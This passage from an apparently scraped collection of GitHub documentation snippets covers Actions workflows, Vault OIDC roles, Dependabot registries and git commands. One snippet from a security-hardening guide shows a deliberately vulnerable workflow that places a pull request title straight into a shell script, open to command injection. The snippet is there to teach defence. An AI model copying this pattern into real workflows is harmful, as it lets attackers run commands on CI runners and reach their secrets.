jwt\n```\n\n----------------------------------------\n\nTITLE: Configuring a Vault Role (Shell)\nDESCRIPTION: This command configures a role in HashiCorp Vault that maps a JWT to a set of policies. It defines the type of role, the user claim, the bound claims (e.g., repository), associated policies, and the TTL of the resulting access token.  Ensures that `bound_claims` parameter is defined for your security requirements, and has at least one condition. Optionally, you can also set the `bound_subject` as well as the `bound_audiences` parameter.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nvault write auth/jwt/role/myproject-production -<<EOF\n{\n  \"role_type\": \"jwt\",\n  \"user_claim\": \"actor\",\n  \"bound_claims\": {\n    \"repository\": \"user-or-org-name/repo-name\"\n  },\n  \"policies\": [\"myproject-production\"],\n  \"ttl\": \"10m\"\n}\nEOF\n```\n\n----------------------------------------\n\nTITLE: Configuring JavaScript Action Runtime in YAML\nDESCRIPTION: This example demonstrates how to configure the runtime environment for a JavaScript action within the `runs` section of the action metadata file using YAML. It specifies the use of Node.js v20 and points to the `main.js` file as the entry point for the action's code.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\nruns:\n  using: 'node20'\n  main: 'main.js'\n```\n\n----------------------------------------\n\nTITLE: Example Reusable Workflow Definition - YAML\nDESCRIPTION: This defines a complete example of a reusable workflow named `workflow-B.yml`.  It defines an input `config-path` and a secret `token` then uses them with the `actions/labeler` action. The workflow is triggered by the `workflow_call` event.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/reusing-workflows.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nname: Reusable workflow example\n\non:\n  workflow_call:\n    inputs:\n      config-path:\n        required: true\n        type: string\n    secrets:\n      token:\n        required: true\n\njobs:\n  triage:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/labeler@v4\n      with:\n        repo-token: ${{ secrets.token }}\n        configuration-path: ${{ inputs.config-path }}\n```\n\n----------------------------------------\n\nTITLE: Uploading SARIF Results\nDESCRIPTION: This step uploads the generated SARIF file (`results.sarif`) to GitHub using the `upload-sarif` action. The `sarif_file` parameter specifies the path to the SARIF file relative to the repository root. This action integrates the ESLint analysis with GitHub Code Scanning.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/integrating-with-code-scanning/uploading-a-sarif-file-to-github.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\n- uses: {% data reusables.actions.action-codeql-action-upload-sarif %}\n  with:\n    # Path to SARIF file relative to the root of the repository\n    sarif_file: results.sarif\n```\n\n----------------------------------------\n\nTITLE: Publish PowerShell Module to Gallery with GitHub Actions\nDESCRIPTION: This workflow publishes a PowerShell module to the PowerShell Gallery when a release is created. It checks out the code, builds the module using `build.ps1`, and then publishes it using `Publish-Module`. The NuGet API key is retrieved from a GitHub secret.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-powershell.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\nname: Publish PowerShell Module\n\non:\n  release:\n    types: [created]\n\njobs:\n  publish-to-gallery:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Build and publish\n        env:\n          NUGET_KEY: {% raw %}${{ secrets.NUGET_KEY }}{% endraw %}\n        shell: pwsh\n        run: |\n          ./build.ps1 -Path /tmp/samplemodule\n          Publish-Module -Path /tmp/samplemodule -NuGetApiKey $env:NUGET_KEY -Verbose\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_PROJECT_PATH to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_PROJECT_PATH` to the GitHub Actions equivalent `${{ github.repository }}`. Repository info.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_62\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.repository }}\n```\n\n----------------------------------------\n\nTITLE: Using a Private JavaScript Action in GitHub Workflow (YAML)\nDESCRIPTION: This workflow demonstrates how to use a private JavaScript action within the same repository. It first checks out the repository using `actions/checkout`, then uses the local action using `uses: ./`. The action takes an input `who-to-greet`. The output time is then printed. The workflow is triggered on push events.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-javascript-action.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\non: [push]\n\njobs:\n  hello_world_job:\n    runs-on: ubuntu-latest\n    name: A job to say hello\n    steps:\n      # To use this repository's private action,\n      # you must check out the repository\n      - name: Checkout\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Hello world action step\n        uses: ./ # Uses an action in the root directory\n        id: hello\n        with:\n          who-to-greet: 'Mona the Octocat'\n      # Use the output from the `hello` step\n      - name: Get the output time\n        run: echo \"The time was {% raw %}${{ steps.hello.outputs.time }}{% endraw %}\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Git Line Endings on Windows\nDESCRIPTION: This snippet configures Git to handle line endings correctly on Windows by setting the `core.autocrlf` option to `true`. This ensures that line endings in files checked out are correct for Windows and are converted to Unix style when committing files for compatibility.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/configuring-git-to-handle-line-endings.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git config --global core.autocrlf true\n# Configure Git to ensure line endings in files you checkout are correct for Windows.\n# For compatibility, line endings are converted to Unix style when you commit files.\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Workflow: Script Injection via PR Title - YAML\nDESCRIPTION: This YAML snippet demonstrates a vulnerable GitHub Actions workflow that is susceptible to script injection.  It directly uses the pull request title within a shell script, allowing an attacker to inject arbitrary commands. The vulnerability lies in the direct substitution of the `github.event.pull_request.title` expression into the `run` command's shell script.  An attacker can manipulate the PR title to execute unintended commands on the runner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n      - name: Check PR title\n        run: |\n          title=\"${{ github.event.pull_request.title }}\"\n          if [[ $title =~ ^octocat ]]; then\n          echo \"PR title starts with 'octocat'\"\n          exit 0\n          else\n          echo \"PR title did not start with 'octocat'\"\n          exit 1\n          fi\n```\n\n----------------------------------------\n\nTITLE: Configuring Languages in CodeQL Analysis without Matrix (YAML)\nDESCRIPTION: This snippet shows how to specify languages for CodeQL analysis without using a matrix strategy.  The `languages` parameter within the `init` action allows you to explicitly define which languages should be analyzed. This will trigger a sequential analysis of the specified languages.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\n- uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    languages: c-cpp, csharp, python\n```\n\n----------------------------------------\n\nTITLE: Enabling SSH agent forwarding in a bash script\nDESCRIPTION: This bash script demonstrates how to enable SSH agent forwarding when connecting to a server. It uses the `-A` option with the `ssh` command to forward the SSH agent connection. This allows the remote server to use the user's local SSH keys for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/managing-deploy-keys.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nssh -A serverA 'bash -s' < deploy.sh\n```\n\n----------------------------------------\n\nTITLE: Upload Python Package Workflow using Trusted Publishing (YAML)\nDESCRIPTION: This workflow automates the process of building and publishing a Python package to PyPI upon a new release. It uses Trusted Publishing for secure authentication, eliminating the need for API tokens. The workflow consists of two jobs: 'release-build' to build the distribution and 'pypi-publish' to upload it to PyPI.  It requires read access to the repository's contents and write access to the id-token permission for trusted publishing.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-python.md#_snippet_11\n\nLANGUAGE: YAML\nCODE:\n```\nname: Upload Python Package\n\non:\n  release:\n    types: [published]\n\npermissions:\n  contents: read\n\njobs:\n  release-build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n\n      - uses: {% data reusables.actions.action-setup-python %}\n        with:\n          python-version: \"3.x\"\n\n      - name: Build release distributions\n        run: |\n          # NOTE: put your own distribution build steps here.\n          python -m pip install build\n          python -m build\n\n      - name: Upload distributions\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: release-dists\n          path: dist/\n\n  pypi-publish:\n    runs-on: ubuntu-latest\n\n    needs:\n      - release-build\n\n    permissions:\n      # IMPORTANT: this permission is mandatory for trusted publishing\n      id-token: write\n\n    # Dedicated environments with protections for publishing are strongly recommended.\n    environment:\n      name: pypi\n      # OPTIONAL: uncomment and update to include your PyPI project URL in the deployment status:\n      # url: https://pypi.org/p/YOURPROJECT\n\n    steps:\n      - name: Retrieve release distributions\n        uses: {% data reusables.actions.action-download-artifact %}\n        with:\n          name: release-dists\n          path: dist/\n\n      - name: Publish release distributions to PyPI\n        uses: pypa/gh-action-pypi-publish@6f7e8d9c0b1a2c3d4e5f6a7b8c9d0e1f2a3b4c5d\n```\n\n----------------------------------------\n\nTITLE: Set Vulnerability Severity\nDESCRIPTION: This YAML snippet configures the dependency review action to fail builds if vulnerabilities of moderate severity or higher are detected. It adds the `fail-on-severity` option to the workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/supply-chain-security/understanding-your-software-supply-chain/customizing-your-dependency-review-action-configuration.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n- name: 'Dependency Review'\n  uses: actions/dependency-review-action@v4\n  with:\n    fail-on-severity: moderate\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Packages Repository in build.gradle (Groovy)\nDESCRIPTION: This Groovy snippet configures a Maven repository named \"GitHubPackages\" in the `build.gradle` file. It specifies the URL for the GitHub Packages Maven registry, including the organization and repository name.  It sets up credentials using the `GITHUB_ACTOR` environment variable for the username and the `GITHUB_TOKEN` environment variable for the password. This configuration enables Gradle to publish packages to GitHub Packages using the GitHub Actions token.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-java-packages-with-gradle.md#_snippet_2\n\nLANGUAGE: groovy\nCODE:\n```\nplugins {\n  ...\n  id 'maven-publish'\n}\n\npublishing {\n  ...\n\n  repositories {\n    maven {\n      name = \"GitHubPackages\"\n      url = \"https://maven.pkg.github.com/octocat/hello-world\"\n      credentials {\n        username = System.getenv(\"GITHUB_ACTOR\")\n        password = System.getenv(\"GITHUB_TOKEN\")\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Environment Variable: GitHub Actions Workflow (YAML)\nDESCRIPTION: Defines an environment variable `MAVEN_PATH` within a GitHub Actions workflow job. This variable is accessible within the job's execution environment.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  maven-build:\n    env:\n      MAVEN_PATH: '/usr/local/maven'\n```\n\n----------------------------------------\n\nTITLE: Merging Upstream Changes into Local Branch\nDESCRIPTION: This snippet merges the changes from the upstream default branch (in this case, `upstream/main`) into the local default branch. It uses the `git merge` command to integrate the changes, keeping the fork's default branch in sync with the upstream repository. It handles fast-forward merges and indicates potential conflicts.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/syncing-a-fork.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ git merge upstream/main\n> Updating a422352..5fdff0f\n> Fast-forward\n>  README                    |    9 -------\n>  README.md                 |    7 ++++++\n>  2 files changed, 7 insertions(+), 9 deletions(-)\n>  delete mode 100644 README\n>  create mode 100644 README.md\n```\n\nLANGUAGE: shell\nCODE:\n```\n$ git merge upstream/main\n> Updating 34e91da..16c56ad\n> Fast-forward\n>  README.md                 |    5 +++--\n>  1 file changed, 3 insertions(+), 2 deletions(-)\n```\n\n----------------------------------------\n\nTITLE: Masking and Passing Secrets Between Jobs (Bash)\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow with two jobs: `secret-generator` and `secret-consumer`. The first job generates a secret, masks it, and stores it in an imaginary secret store. The second job retrieves the secret from the store and uses it.  It relies on an external secret store and a repository secret for credentials.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_21\n\nLANGUAGE: yaml\nCODE:\n```\non: push\n\njobs:\n  secret-generator:\n    runs-on: ubuntu-latest\n    outputs:\n      handle: {% raw %}${{ steps.generate-secret.outputs.handle }}{% endraw %}\n    steps:\n    - uses: some/secret-store@27b31702a0e7fc50959f5ad993c78deac1bdfc29\n      with:{% raw %}\n        credentials: ${{ secrets.SECRET_STORE_CREDENTIALS }}\n        instance: ${{ secrets.SECRET_STORE_INSTANCE }}{% endraw %}\n    - name: generate secret\n      id: generate-secret\n      shell: bash\n      run: |\n        GENERATED_SECRET=$((RANDOM))\n        echo \"::add-mask::$GENERATED_SECRET\"\n        SECRET_HANDLE=$(secret-store store-secret \"$GENERATED_SECRET\")\n        echo \"handle=$SECRET_HANDLE\" >> \"$GITHUB_OUTPUT\"\n  secret-consumer:\n    runs-on: macos-latest\n    needs: secret-generator\n    steps:\n    - uses: some/secret-store@27b31702a0e7fc50959f5ad993c78deac1bdfc29\n      with:{% raw %}\n        credentials: ${{ secrets.SECRET_STORE_CREDENTIALS }}\n        instance: ${{ secrets.SECRET_STORE_INSTANCE }}{% endraw %}\n    - name: use secret\n      shell: bash\n      run: |{% raw %}\n        SECRET_HANDLE=\"${{ needs.secret-generator.outputs.handle }}\"\n        RETRIEVED_SECRET=$(secret-store retrieve-secret \"$SECRET_HANDLE\")\n        echo \"::add-mask::$RETRIEVED_SECRET\"\n        echo \"We retrieved our masked secret: $RETRIEVED_SECRET\"{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Triage Pull Request Based on Author and File Changes - YAML\nDESCRIPTION: This workflow automatically labels and comments on pull requests based on the author and the files that have been changed. It runs when a pull request is opened and changes files such as `package*.json`, `.github/CODEOWNERS`, or files within `.github/workflows/**`. The workflow checks if the author is not `octobot` or `dependabot[bot]` and then uses the GitHub CLI (`gh`) to add the 'invalid' label and a specific comment.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  pull_request:\n    types:\n      - opened\n    paths:\n      - '.github/workflows/**'\n      - '.github/CODEOWNERS'\n      - 'package*.json'\n\njobs:\n  triage:\n    if: >-\n      github.event.pull_request.user.login != 'octobot' &&\n      github.event.pull_request.user.login != 'dependabot[bot]'\n    runs-on: ubuntu-latest\n    steps:\n      - name: \"Comment about changes we can't accept\"\n        env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n          PR: {% raw %}${{ github.event.pull_request.html_url }}{% endraw %}\n        run: |\n          gh pr edit $PR --add-label 'invalid'\n          gh pr comment $PR --body 'It looks like you edited `package*.json`, `.github/CODEOWNERS`, or `.github/workflows/**`. We do not allow contributions to these files. Please review our [contributing guidelines](https://github.com/octo-org/octo-repo/blob/main/CONTRIBUTING.md) for what contributions are accepted.'\n```\n\n----------------------------------------\n\nTITLE: Python Workflow excluding a Python Version\nDESCRIPTION: This workflow demonstrates excluding a specific Python version based on the operating system using the `exclude` keyword in the matrix strategy. This prevents the workflow from running with Python 3.11 on macOS and Windows.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-python.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nname: Python package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: {% raw %}${{ matrix.os }}{% endraw %}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest, windows-latest]\n        python-version: [\"3.9\", \"3.11\", \"3.13\", \"pypy3.10\"]\n        exclude:\n          - os: macos-latest\n            python-version: \"3.11\"\n          - os: windows-latest\n            python-version: \"3.11\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Docker with username and password\nDESCRIPTION: This snippet shows how to configure Dependabot to authenticate with a Docker registry using a username and password in the `dependabot.yml` file.  The registry type, URL, username, and password (stored as a secret) are specified.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  dockerhub:\n    type: docker-registry\n    url: https://registry.hub.docker.com\n    username: octocat\n    password: ${{secrets.MY_DOCKERHUB_PASSWORD}}\n```\n\n----------------------------------------\n\nTITLE: Cloning and Running Blackbeard Agent\nDESCRIPTION: This snippet outlines the steps to clone the Blackbeard extension repository, install dependencies, and start the agent. It uses npm to manage dependencies and run the agent on port 3000.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/quickstart-for-github-copilot-extensions-using-agents.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install\n```\n\nLANGUAGE: shell\nCODE:\n```\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Using Env Context in Workflow\nDESCRIPTION: This YAML workflow defines environment variables at the workflow, job, and step levels, and then accesses those variables using the `${{ env.VARIABLE-NAME }}` syntax within the `run` steps. It shows how environment variable values can be overridden at different scopes.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nname: Hi Mascot\non: push\nenv:\n  mascot: Mona\n  super_duper_var: totally_awesome\n\njobs:\n  windows_job:\n    runs-on: windows-latest\n    steps:\n      - run: echo 'Hi ${{ env.mascot }}'  # Hi Mona\n      - run: echo 'Hi ${{ env.mascot }}'  # Hi Octocat\n        env:\n          mascot: Octocat\n  linux_job:\n    runs-on: ubuntu-latest\n    env:\n      mascot: Tux\n    steps:\n      - run: echo 'Hi ${{ env.mascot }}'  # Hi Tux\n```\n\n----------------------------------------\n\nTITLE: Example of repository and path exclusions\nDESCRIPTION: This YAML example illustrates how to configure content exclusions for GitHub Copilot, demonstrating how to exclude files globally, within specific repositories, and using various wildcard patterns. It covers different repository referencing methods, including HTTPS, Git, and SSH URLs, and shows how to use glob patterns for flexible file matching.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configuring-and-auditing-content-exclusion/excluding-content-from-github-copilot.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n# Ignore all `.env` files from all file system roots (Git and non-Git).\n# For example, this excludes `REPOSITORY-PATH/.env` and also `/.env`.\n# This could also have been written on a single line as:\n#\n# \"*\": [\"**/.env\"]\n\"*\":\n  - \"**/.env\"\n\n# In the `octo-repo` repository in this organization:\nocto-repo:\n  # Ignore the `/src/some-dir/kernel.rs` file.\n  - \"/src/some-dir/kernel.rs\"\n\n# In the `primer/react` repository on {% data variables.product.prodname_dotcom %}:\nhttps://github.com/primer/react.git:\n  # Ignore files called `secrets.json` anywhere in this repository.\n  - \"secrets.json\"\n  # Ignore files called `temp.rb` in or below the `/src` directory.\n  - \"/src/**/temp.rb\"\n\n# In the `copilot` repository of any {% data variables.product.prodname_dotcom %} organization:\ngit@github.com:*/copilot:\n  # Ignore any files in or below the `/__tests__` directory.\n  - \"/__tests__/**\"\n  # Ignore any files in the `/scripts` directory.\n  - \"/scripts/*\"\n\n# In the `gitlab-org/gitlab-runner` repository on GitLab:\ngit@gitlab.com:gitlab-org/gitlab-runner.git:\n  # Ignore the `/main_test.go` file.\n  - \"/main_test.go\"\n  # Ignore any files with names beginning with `server` or `session` anywhere in this repository.\n  - \"{server,session}*\"\n  # Ignore any files with names ending with `.md` or `.mk` anywhere in this repository.\n  - \"*.m[dk]\"\n  # Ignore files directly within directories such as `packages` or `packaged` anywhere in this repository.\n  - \"**/package?/*\"\n  # Ignore files in or below any `security` directories, anywhere in this repository.\n  - \"**/security/**\"\n```\n\n----------------------------------------\n\nTITLE: Conditional Job Execution Based on Workflow Conclusion\nDESCRIPTION: This YAML snippet demonstrates how to run jobs conditionally based on the conclusion (success or failure) of a triggering workflow named 'Build'. It utilizes the `github.event.workflow_run.conclusion` property within the `if` condition to determine whether to execute the `on-success` or `on-failure` job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_57\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  workflow_run:\n    workflows: [Build]\n    types: [completed]\n\njobs:\n  on-success:\n    runs-on: ubuntu-latest\n    if: {% raw %}${{ github.event.workflow_run.conclusion == 'success' }}{% endraw %}\n    steps:\n      - run: echo 'The triggering workflow passed'\n  on-failure:\n    runs-on: ubuntu-latest\n    if: {% raw %}${{ github.event.workflow_run.conclusion == 'failure' }}{% endraw %}\n    steps:\n      - run: echo 'The triggering workflow failed'\n```\n\n----------------------------------------\n\nTITLE: Using the always Status Check Function in GitHub Actions\nDESCRIPTION: This YAML snippet shows the usage of the `always()` function within an `if` conditional. The `always()` function will always return `true`, causing the step to execute regardless of whether previous steps have succeeded or failed, or if the workflow was cancelled. It is useful for steps that need to run in all cases.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nif: {% raw %}${{ always() }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Referencing Container on Docker Hub in Workflow (YAML)\nDESCRIPTION: This snippet demonstrates how to reference a Docker container image hosted on Docker Hub as an action within a GitHub Actions workflow.  It uses the `docker://{image}:{tag}` syntax in the `uses` field. Security best practices recommend verifying the integrity of Docker images.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/using-pre-written-building-blocks-in-your-workflow.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n```yaml\njobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: docker://alpine:3.8\n```\n```\n\n----------------------------------------\n\nTITLE: Migrate Azure DevOps Build Pipeline to GitHub Actions\nDESCRIPTION: This command migrates an Azure DevOps build pipeline to a GitHub Actions workflow. It requires the pipeline ID, the target GitHub repository URL, and an output directory. The command opens a pull request with the converted workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer migrate azure-devops pipeline --pipeline-id :pipeline_id --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate\n```\n\n----------------------------------------\n\nTITLE: Adding a Remote URL with Git\nDESCRIPTION: This command adds a new remote URL to a local Git repository. This allows the user to fetch and push updates from/to another repository, usually an upstream repository in a fork workflow.  The command takes a remote name (e.g., `upstream`) and the URL of the remote repository.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/pushing-commits-to-a-remote-repository.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngit remote add upstream THEIR_REMOTE_URL\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies with Bundler\nDESCRIPTION: This YAML snippet shows how to install dependencies using Bundler in a GitHub Actions workflow. It checks out the code, sets up a specific Ruby version, and then runs `bundle install` to install the project's dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n  with:\n    ruby-version: '3.1'\n- run: bundle install\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_JOB_URL to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_JOB_URL` to the GitHub Actions equivalent `${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}`. This constructs the URL for the current job's run in GitHub Actions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_27\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on label events\nDESCRIPTION: This code snippet shows how to trigger a GitHub Actions workflow when a label is created or deleted in a repository. The `on` keyword specifies the `label` event, and the `types` keyword filters for specific activity types: `created` and `deleted`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  label:\n    types: [created, deleted]\n```\n\n----------------------------------------\n\nTITLE: Customize Subject Claim: Repository Visibility and Owner\nDESCRIPTION: This JSON template customizes the `sub` claim to include `repository_owner` and `repository_visibility`. It allows restricting cloud role access to private repositories within an organization or enterprise. The corresponding cloud provider OIDC configuration should be updated to require specific values for these claims.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"include_claim_keys\": [\n       \"repository_owner\",\n       \"repository_visibility\"\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Azure DevOps NuGet feed with username/password in dependabot.yml\nDESCRIPTION: This snippet configures an Azure DevOps NuGet feed in `dependabot.yml` using a username and password. The registry URL points to the Azure DevOps feed, and credentials are provided.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  nuget-azure-devops:\n    type: nuget-feed\n    url: https://pkgs.dev.azure.com/.../_packaging/My_Feed/nuget/v3/index.json\n    username: octocat@example.com\n    password: ${{secrets.MY_AZURE_DEVOPS_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: Creating a Mirrored Clone\nDESCRIPTION: Creates a bare mirrored clone of the repository, allowing for ongoing updates from the original repository.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/duplicating-a-repository.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngit clone --mirror https://{% data variables.product.product_url %}/EXAMPLE-USER/REPOSITORY-TO-MIRROR.git\n```\n\n----------------------------------------\n\nTITLE: Multi-OS Build: GitHub Actions Workflow (YAML)\nDESCRIPTION: Configures a GitHub Actions workflow to run tests on multiple operating systems (macos-latest, ubuntu-latest) using a matrix strategy.  It checks out the repository, sets up Node.js version 20, and executes bats tests.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions.md#_snippet_7\n\nLANGUAGE: YAML\nCODE:\n```\nname: demo-workflow\non:\n  push:\njobs:\n  test:\n    runs-on: {% raw %}${{ matrix.os }}{% endraw %}\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [macos-latest, ubuntu-latest]\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: 20\n      - run: npm install -g bats\n      - run: bats tests\n        working-directory: ./scripts/myapp\n```\n\n----------------------------------------\n\nTITLE: Enabling Bundler Caching\nDESCRIPTION: This YAML snippet shows how to enable automatic caching of gems using the `bundler-cache` option in the `ruby/setup-ruby` action. This improves workflow speed by caching gems between runs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n  with:\n    bundler-cache: true\n```\n\n----------------------------------------\n\nTITLE: Triggering Workflow on Registry Package Published Event (YAML)\nDESCRIPTION: This workflow configuration triggers when a new package version is published to the GitHub Package Registry. It utilizes the `registry_package` event with the `published` type.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_40\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  registry_package:\n    types: [published]\n```\n\n----------------------------------------\n\nTITLE: Storing Build Metadata in Environment Variables\nDESCRIPTION: This YAML configuration shows how to store metadata, such as a build timestamp, in an environment variable and use it later in a workflow. The timestamp is obtained using the `date` command and appended to the `$GITHUB_ENV` file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_28\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Store build timestamp\n    run: echo \"BUILD_TIME=$(date +'%T')\" >> $GITHUB_ENV\n\n  - name: Deploy using stored timestamp\n    run: echo \"Deploying at $BUILD_TIME\"\n\n```\n\n----------------------------------------\n\nTITLE: Triggering Workflow on Push Affecting Specific Files (YAML)\nDESCRIPTION: This workflow configuration will trigger the workflow when a push event occurs that includes changes to a JavaScript file (`.js`).\nSOURCE: 